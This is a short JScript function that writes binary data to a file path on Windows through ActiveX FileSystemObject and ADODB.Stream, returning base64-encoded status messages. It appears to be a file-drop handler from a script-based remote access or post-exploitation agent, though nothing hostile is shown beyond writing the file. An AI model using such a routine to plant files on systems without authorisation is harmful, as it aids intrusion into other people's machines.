function upload(data, path) {
    try {
        fs = new ActiveXObject("Scripting.FileSystemObject")
        if (fs.FileExists(path) == true) {
            return b64e('File already exists.');
        }
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1;
        stream.Write(data);
        stream.Position = 0;
        stream.SaveToFile(path, 2);
        stream.Close();
        return b64e('Successfully uploaded file.');
    } catch (e) {
        return b64e(e.message);
    }
}